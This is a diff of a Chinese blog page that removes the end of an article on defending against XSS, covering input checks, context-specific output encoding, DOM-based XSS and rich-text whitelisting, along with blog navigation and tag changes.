-<h4>输入检查</h4>
-
-<p>&emsp;&emsp;XSS Filter：XSS输入检查方式<br>&emsp;&emsp;所有客户端的JavaScript检查极容易被攻击者绕过，所以XSS输入检查的逻辑必须要放在服务端代码中实现。不过客户端JavaScript的输入检查，可以阻挡大部分正常用户的错误操作，从而节约服务器资源。<br>&emsp;&emsp;XSS Filter存在的两个问题：<br>&emsp;&emsp;&emsp;&emsp;# XSS Filter对语境的理解并不完整 。<br>&emsp;&emsp;&emsp;&emsp;# XSS Filter对特殊字符的处理可能会改变用户数据的语义。<br>&emsp;&emsp;针对上述两个问题，最好的解决办法是，尽量避免全局性XSS Filter，尽量避免对输入数据做统一的修改，即<strong>针对不同的场景使用不用的检查方法</strong>。<br>&emsp;&emsp;目前Web开发的普遍做法，是<strong>同时</strong>在<strong>客户端JavaScript</strong>中和<strong>服务器端代码</strong>中实现输入检查。</p>
-<h4>输出检查</h4>
-
-
-<p>&emsp;&emsp;遵循“在正确的地方使用正确的编码方式”原则，使用相对应的安全编码函数对数据变量进行编码或者转义来防御XSS攻击</p>
-<h4>正确地防御XSS</h4>
-
-<h5>防御反射型与存储型XSS</h5>
-
-<ul>
-<li>在HTML标签中输出<ul>
-<li>HtmlEncode</li>
-</ul>
-</li>
-<li>在HTML属性中输出<ul>
-<li>HtmlEncode</li>
-</ul>
-</li>
-<li>在<code>&lt;script&gt;</code>标签中输出<ul>
-<li>确保输出的变量在引号内</li>
-<li>使用JavascriptEncode</li>
-</ul>
-</li>
-<li>在事件中输出<ul>
-<li>JavascriptEncode </li>
-</ul>
-</li>
-<li>在CSS中输出<ul>
-<li>ESAPI.encoder().encodeForCSS()</li>
-</ul>
-</li>
-<li>在URL地址中输出<ul>
-<li>先检查变量是否以”http”开头</li>
-<li>对变量进行URLEncode</li>
-</ul>
-</li>
-<li>······</li>
-</ul>
-<h5>防御DOM型XSS</h5>
-
-<p>&emsp;&emsp;由于DOM型XSS是通过修改页面DOM节点所形成，即DOM型XSS是从JavaScript中输出数据到HTML页面里。<br>&emsp;在这里代码会经历HTML–&gt;JavaScript–&gt;HTML两个过程，而在第二个过程中，会出现两种情况，一是输出到事件或者脚本，二是输出到HTMl内容或者属性。<br>&emsp;&emsp;因此，<strong>防御方法</strong>应该是这样:</p>
-<ul>
-<li>过程一(HTML–&gt;JavaScript)：    <ul>
-<li>使用javascriptEncode</li>
-</ul>
-</li>
-<li>过程二(JavaScript–&gt;HTML)：<ul>
-<li>输出到事件或者脚本：使用javascriptEncode</li>
-<li>输出到HTML内容或者属性：使用HtmlEncode</li>
-</ul>
-</li>
-</ul>
-<h5>处理富文本</h5>
-
-<p>&emsp;&emsp;<strong>富文本</strong>：用户自定义的HTML代码</p>
-<ul>
-<li>在过滤富文本时，”事件”以及危险的标签(如<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;form&gt;</code>)应该严格被禁止。</li>
-<li>在标签的选择上，应该使用白名单，避免使用黑名单</li>
-<li>尽可能的禁止用户自定义CSS与style</li>
-</ul>
-<p>&emsp;&emsp;在网上有一些比较成熟的实现了对富文本XSS检查的开源项目(如Anti-Samy、HTMLPurify)</p>
-<p><br/><br/><br/><br><font face="Georgia" color=#c4444>魔高一尺，道高一丈</font></p>
-<p>作者：WebDogC<br>参考书籍《白帽子讲Web安全》</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS、security、Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/03/05/XSS/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
@@ -1606,6 +1481,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">逻辑、验证码、越权、支付、security、Web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">复现、CTF、study、flag、ssh</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">复现、CTF、study、flag、前置、环境</a>
               </li>
             
             <div class="clearfix"></div>
